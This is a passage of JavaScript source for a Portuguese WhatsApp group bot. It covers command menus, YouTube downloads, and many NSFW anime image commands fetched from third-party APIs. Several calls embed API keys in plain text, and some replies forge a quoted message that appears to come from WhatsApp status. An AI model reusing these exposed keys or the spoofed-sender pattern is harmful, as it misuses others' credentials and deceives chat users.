┃⋆│💎➢ ${prefix}getvideo rem ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mimir ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo coxinha ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo saitama ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo loli ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo jujutsu ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo hanekawa ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo bleach ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mob ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo grupo ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo fateseries ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo calhambeque ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo 2b ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo love ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo rusbe ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo gimme ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo asta ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo padoru ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo naruto ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo tadano ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo titan ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo monster ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo kaneki ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo naruto ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo rage ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo blackclover ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mitsuki ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo animes2 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo animes3 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo baladinha ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo fireforce ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mieruko ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo medusa ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo tenki ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo hero ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo assault ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo dxd ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mushoku ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo kyoukai ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo chainsaw ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo mob2 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo animes4 ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo saber ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo kitagawa ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo kimetsu ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo makima ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo fate ⟨🎬⟩
┃⋆│
┃⋆│💎➢ ${prefix}getvideo monogatari ⟨🎬⟩
┃⋆╰───────────────────
╰━════════════════════⊷`
})
break
case 'katana2': 
if (!isOwner) return reply('somente meu criador')
textmenu = `grupo encerrado pelo zadik, NUNCA DESAFIE UM DEUS ` 
reply(textmenu)
break
case 'destrava':
case 'destravar': 
if (!isGroupAdmins) return reply(mess.only.admin)
textmenu = `




.




.




.




.




.



.





.




.




.




.




.




.




.




.




.





.




.






.









.







.
destrava de pack hentai by zadik ` 
reply(textmenu)
break
case 'patentes':
                   addFilter(from)
                      if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
const patentegif2 = fs.readFileSync('./src/patentegif.mp4')
loli.sendMessage(from, patentegif2,  MessageType.video, {mimetype: 'video/gif', quoted: say1, caption: `
╭━════════════════════⊷
┃⋆╭───────────────────
┃⋆│⬩ ᴍᴇɴᴜ ᴅᴇ ᴘᴀᴛᴇɴᴛᴇs
┃⋆│
┃⋆│💎➢ Bronze I🥉 
┃⋆│
┃⋆│💎➢  Bronze II🥉 
┃⋆│
┃⋆│💎➢  Bronze  III🥉 
┃⋆│
┃⋆│💎➢  Bronze  IV🥉 
┃⋆│
┃⋆│💎➢  Bronze  V🥉
┃⋆│
┃⋆│💎➢  Prata I🥈
┃⋆│
┃⋆│💎➢  Prata II🥈
┃⋆│
┃⋆│💎➢  Prata III🥈
┃⋆│
┃⋆│💎➢  Prata IV🥈
┃⋆│
┃⋆│💎➢  Prata V🥈
┃⋆│
┃⋆│💎➢  Ouro I🥇
┃⋆│
┃⋆│💎➢  Ouro II🥇
┃⋆│
┃⋆│💎➢  Ouro III🥇
┃⋆│
┃⋆│💎➢  Ouro IV🥇
┃⋆│
┃⋆│💎➢  Ouro V🥇 
┃⋆│
┃⋆│💎➢  Campeão I🏆 
┃⋆│
┃⋆│💎➢  Campeão II🏆 
┃⋆│
┃⋆│💎➢  Campeão III🏆 
┃⋆│
┃⋆│💎➢  Campeão IV🏆
┃⋆│
┃⋆│💎➢  Campeão V🏆 
┃⋆│
┃⋆│💎➢  Diamante I 💎 
┃⋆│
┃⋆│💎➢  Diamante II 💎 
┃⋆│
┃⋆│💎➢  Diamante III 💎 
┃⋆│
┃⋆│💎➢  Diamante IV 💎 
┃⋆│
┃⋆│💎➢  Diamante V 💎 
┃⋆│
┃⋆│💎➢  Mestre I 🐂 
┃⋆│
┃⋆│💎➢  Mestre II 🐂 
┃⋆│
┃⋆│💎➢  Mestre III 🐂 
┃⋆│
┃⋆│💎➢  Mestre IV 🐂 
┃⋆│
┃⋆│💎➢  Mestre V 🐂 
┃⋆│
┃⋆│💎➢  Mítico I 🔮 
┃⋆│
┃⋆│💎➢  Mítico II 🔮 
┃⋆│
┃⋆│💎➢  Mítico III 🔮 
┃⋆│
┃⋆│💎➢  Mítico IV 🔮 
┃⋆│
┃⋆│💎➢ Mítico V 🔮 
┃⋆│
┃⋆│💎➢  God I🕴 
┃⋆│
┃⋆│💎➢  God II🕴 
┃⋆│
┃⋆│💎➢  God III🕴
┃⋆│
┃⋆│💎➢  God IV🕴
┃⋆│
┃⋆│💎➢  God V🕴
┃⋆│
┃⋆│💎➢  Grande Mestre I 🛐  
┃⋆│
┃⋆│💎➢  Grande Mestre II 🛐 
┃⋆│
┃⋆│💎➢  Grande Mestre III 🛐 
┃⋆│
┃⋆│💎➢  Grande Mestre IV 🛐 
┃⋆│
┃⋆│💎➢  Elite🛡 
┃⋆│
┃⋆│💎➢  Global🌏 
┃⋆│
┃⋆│💎➢  Herói⚔ 
┃⋆│
┃⋆│💎➢  Lendário🏯 
┃⋆│
┃⋆│💎➢  Semi-Deus👼 
┃⋆│
┃⋆│💎➢  Arcanjo😇 
┃⋆│
┃⋆│💎➢  Demoníaco👹 
┃⋆│
┃⋆│💎➢  Deus-Sama🧙‍♂️
┃⋆│
┃⋆│💎➢  Divindade 🤴 
┃⋆│
┃⋆│💎➢  Divindade Suprema  👤👁
┃⋆│
┃⋆╰───────────────────
╰━════════════════════⊷ 
⭐👸ραтєηтєѕ ∂σ нєηρℓαу👸⭐`})
break
                    

case 'play4':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo : ${prefix}cradles`)	
reply(mess.wait)
play = args.join(" ")
anu = await fetchJson(`https://hardianto.xyz/api/yt/playmp3?query=${play}&apikey=hardianto`)
if (anu.error) return reply(anu.error)
infomp3 = `「 ⭐*HENPLAY MUSIC*⭐」\n\n*• Título:* ${anu.title}\n*• Data:* ${anu.published}\n*• Canal:* ${anu.channel}\n\n\n*💜 DOWNLOAD  CONCLUÍDO 💜*`
buffer = await getBuffer(anu.thumb)
lagu = await getBuffer(anu.url)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: infomp3})
loli.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": ` ${groupName}`, 'jpegThumbnail': await getBuffer(anu.thumb)}}}})
break

case 'playmp4':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo : ${prefix}cradles`)	
reply(mess.wait)
play = args.join(" ")
anu = await fetchJson(`https://api-alphabot.herokuapp.com/api/downloader/youtube/playmp4?query=${play}&apikey=Alphabot`)
if (anu.error) return reply(anu.error)
infomp3 = `「 ⭐*HENPLAY VIDEO*⭐」\n\n*• Título:* ${anu.results.title}\n*• Tamanho:* ${anu.results.size}\n*• Canal:* ${anu.results.channel}\n\n\n*💜 DOWNLOAD  CONCLUÍDO 💜*`
buffer = await getBuffer(anu.results.thumb)
lagu = await getBuffer(anu.results.result)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: infomp3})
loli.sendMessage(from, lagu, video, {mimetype: 'video/mp4', quoted: say1, thumbnail:null})
break

case 'tourl':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
reply(mess.wait)
owgi = await loli.downloadAndSaveMediaMessage(ger)
anu = await imgbb("941644256336912a1409c0bcfce50071", owgi)
imurl = `${anu.display_url}`
reply(imurl)
}
break

case 'play2':
 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo : ${prefix}play Plutão`)
reply(mess.wait)
query = args.join(" ")
url = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/yt/playmp3?query=${query}&apikey=apiteam`)
resu = `「 ⭐*HENPLAY MUSIC*⭐」\n\n*• Titulo: ${url.titulo}\n*Musica encontrada!*`
imagem = await getBuffer (url.thumb)
audioa = await getBuffer (url.url)
loli.sendMessage(from, imagem, image, {quoted:mek, caption: resu})
loli.sendMessage(from, audioa, audio, {mimetype: 'audio/mp4', ptt:true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": ` ${groupName}`, 'jpegThumbnail': await getBuffer(url.thumb)}}}})
break

case 'play3':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo : ${prefix}cradles`)	
reply(mess.wait)
play = args.join(" ")
result = result
result = await fetchJson(`https://hardianto.xyz/api/yt/playmp3?query=${play}&apikey=hardianto`)
if (result.error) return reply(result.error)
infomp3 = `「 ‧͙⁺˚ ･༓☾⭐*HENPLAY MUSIC*⭐‧͙⁺˚ ･༓☾」\n\n*• Título:* ${result.title}\n*• Data:* ${result.published}\n*• Canal:* ${result.channel}\n\n\n*💜 DOWNLOAD  CONCLUÍDO 💜*`
buffer = await getBuffer(result.thumb)
lagu = await getBuffer(result.url)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: infomp3})
loli.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', ptt:true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": ` ${groupName}`, 'jpegThumbnail': await getBuffer(result.thumb)}}}})
break

case 'teste23434ind':   
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (args.length < 1) return reply(`Exemplo : ${prefix}kingslayer`)	
reply(mess.wait)
play = args.join(" ")
anu = await fetchJson(`https://api.lolhuman.xyz/api/ytplay2?apikey=ChOkYbOT8&query=${q}`)
if (anu.error) return reply(anu.error)
infomp3 = `「 *HENPLAY MUSIC* 」\n\n*• Título:* ${anu.result.title}\n\n\n\n*💜DOWNLOAD  CONCLUÍDO💜*`			
buffer = await getBuffer(anu.result.thumbnail)
loli.sendMessage(from, buffer, image, {quoted: say1, caption: infomp3})
lagu = await getBuffer(anu.result.audio)				
loli.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: say1})
break
case 'play':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
                reply(mess.wait)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/ytplay?apikey=ChOkYbOT8&query=${q}`)
                    get_result = get_result.result
                    get_info = get_result.info
                    ini_txt = `「 ⭐*HENPLAY MUSIC*⭐」
`
                    ini_txt += `*Titulo* : ${get_info.title}\n`
                    ini_txt += `*Uploader* : ${get_info.uploader}\n`
                    ini_txt += `*Duracao* : ${get_info.duration}\n`
                    ini_txt += `*Visualizacao* : ${get_info.view}\n`
                    ini_txt += `*Like* : ${get_info.like}\n`
                    ini_txt += `*Dislike* : ${get_info.dislike}\n`
                    ini_txt += `*💜 DOWNLOAD  CONCLUÍDO 💜*` 
                    ini_buffer = await getBuffer(get_info.thumbnail)
                    loli.sendMessage(from, ini_buffer, image, { quoted: say1, thumbnail:null, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio.link)
                    loli.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_info.title}.mp3`, quoted: horiaud, thumbnail:null})
                 break
// MENU +18 DE HENTAI LOLHUMAN
       case 'milf':
       case 'cosplay':
   addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
reply(mess.wait)
              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
		      hori777 = [{buttonId: `${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
              imageMsg = ( await loli.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
              buttonsMessage = {footerText:`Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`, imageMessage: imageMsg,
              contentText:`Clique em Avançar para ir para a próxima imagem`,buttons: hori777,headerType:4}
              prep = await loli.prepareMessageFromContent(from,{buttonsMessage},{quoted: say1})
              loli.relayWAMessage(prep)
              fs.unlinkSync(`./${sender}.jpeg`)
              break
case 'nsfwneko':
				    try {
						if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwneko`, {method: 'get'})
						buffer = await getBuffer(res.result)
						loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: 'ni anjim'})
					} catch (e) {
						console.log(`Error :`, color(e,'red'))
						reply('❌ *ERRO* ❌')
					}
					break
					case 'trap2':
					 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
					    reply(mess.wait)
						res = await fetchJson(`https://tobz-api.herokuapp.com/api/nsfwtrap?apikey=vpIudwzHQKpEpJNIO731`, {method: 'get'})
						buffer = await getBuffer(res.result)
						loli.sendMessage(from, buffer, image, {quoted: say1, thumbnail:null, caption: `trapzin para você onii-chan💜`})
						  
						break
				
					case 'wallpaper':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/wallnime?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss08 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss08, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
case 'wallpapersearch':
                   addFilter(from)
if (args.length < 1) return reply(`Exemplo : ${prefix + command} albedo`)	
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
                    reply(mess.wait)
                    query = args.join('')
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/wallpaper?apikey=ChOkYbOT8&query=${query}`)
                    ini_buffer = await getBuffer(get_result.result)
                    await loli.sendMessage(from, ini_buffer, image, { quoted: say1})
                    break

					case 'trap':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/trap?apikey=ChOkYbOT8`, {method: 'get'})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
const buttonMessagiss1 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss1, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})                       
					break
case 'ecchi':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/ecchi?apikey=ChOkYbOT8`, {method: 'get'})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
const buttonMessagiss2231 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss2231, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})                       
					break
					
				case 'fanart':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/art?apikey=ChOkYbOT8`, {method: 'get'})
                            mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                            gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss2 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss2, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'bunda':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/animebooty?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss3= {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss3, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'sideoppai':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/sideoppai?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss4 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss4, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
        break
					case 'hentaipe':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/animefeets?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss5 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss5, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                              
					break
					case 'vtubers':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hololewd?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss6 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss6, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
                              
					break
					case 'sexyhentai':
				 addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isNsfw) return reply(' *Ative o modo nsfw, para ativar use: .modonsfw on* ')
				gatatauda = body.slice(6)
                            reply(mess.wait)
                            hori = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/lewdanimegirls?apikey=ChOkYbOT8`, {method: 'get'})
                                                 mhan = await loli.prepareMessage(from, hori, image, {thumbnail: null})
                                                 gbutsan = [{buttonId:`${prefix + command}`,buttonText:{displayText:'➡️Avançar'},type:1}]
const buttonMessagiss7 = {
imageMessage: mhan.message.imageMessage,
contentText: `Clique em Avançar para ir para a próxima imagem`,
footerText: `Copyright © zadik/Hori-BOT \n\MES📅: ${bulan1} \n\HORA⏰: ${hr} \n\DIA☀️: ${hari}`,
buttons: gbutsan,
headerType: 4
}
loli.sendMessage(from, buttonMessagiss7, MessageType.buttonsMessage, {
thumbnail: fs.readFileSync('./src/logo.jpeg'),
caption: 'Xrutz',
quoted: say1})
					break
					case 'hentaipack':
addFilter(from)
if (!isRegistered) return reply(ptbr.rg(prefix, pushname))
if (!isOwner) return reply('somente meu criador')
reply(mess.wait)
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/hentai4everyone?apikey=ChOkYbOT8`)
				    loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})																		
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
                    loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/biganimetiddies?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
				     buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
					loli.sendMessage(from, buffer, image, {quoted: mek, thumbnail:null})
					buffer = await getBuffer(`https://api.lolhuman.xyz/api/random2/yuri?apikey=ChOkYbOT8`)
